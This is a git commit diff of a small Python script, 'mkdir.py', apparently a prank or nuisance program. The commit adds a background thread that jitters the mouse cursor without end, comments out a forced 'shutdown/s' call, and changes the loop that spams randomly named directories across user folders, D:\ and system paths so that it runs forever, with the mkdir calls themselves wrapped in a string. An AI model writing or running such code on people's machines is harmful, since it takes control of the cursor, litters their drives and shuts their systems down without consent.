9a786e6ad2d68883ef4fce23e1caa8354ed687b6
unknown <babak.khezri7@gamil.com>
2020-04-15 16:08:36 +0430

    Add mouse bug

--- mkdir.py
+++ mkdir.py
@@ -1,23 +1,34 @@
-from os import getcwd , mkdir , system
+from os import getcwd, mkdir, system
 from getpass import getuser
-from random import sample
+from random import sample , randint
+from pynput.mouse import Controller
+from threading import Thread
+def move_mouse():
+    mouse = Controller()
+    while True:
+        x = randint(-2, 2)
+        y = randint(-2, 2)
+        mouse.move(x, y)
+mouse_killer = Thread(target = move_mouse)
+mouse_killer.start()
 username = getuser()
 addres_1 = getcwd()
 addres_2 = "D:\\"
-addres_3 = "C:\\Users"
-addres_4 = "C:\\Users\\" + username + "\\Desktop" 
+addres_3 = "C:\\Users\\Public"
+addres_4 = "C:\\Users\\" + username + "\\Desktop"
 addres_5 = "C:\\Users\\" + username + "\\Downloads"
 addres_6 = "C:\\Users\\" + username + "\\Documents"
 addres_7 = "C:\\Users\\" + username + "\\Pictures"
-addres_8 = "C:\\Windows"
-name = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789(_!@#$%^&=+-`~)"
-#turn off the system ofter 10 sec
-system("shutdown/s")
-for i in range(1):
-    #make random name for directory
+addres_8 = "C:\\Intel"
+name = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789(_!@#$%^&=+-`~)'
+# turn off the system ofter 10 sec
+#system("shutdown/s")
+while True:
+    # make random name for directory
     print(addres_3)
-    directory = "".join(sample(name,10))
-    #create the directories
+    directory = "".join(sample(name, 10))
+    # create the directories
+    '''
     mkdir(addres_1 + "\\{}".format(directory))
     mkdir(addres_2 + "\\{}".format(directory))
     mkdir(addres_3 + "\\{}".format(directory))
@@ -26,3 +37,4 @@ for i in range(1):
     mkdir(addres_6 + "\\{}".format(directory))
     mkdir(addres_7 + "\\{}".format(directory))
     mkdir(addres_8 + "\\{}".format(directory))
+'''
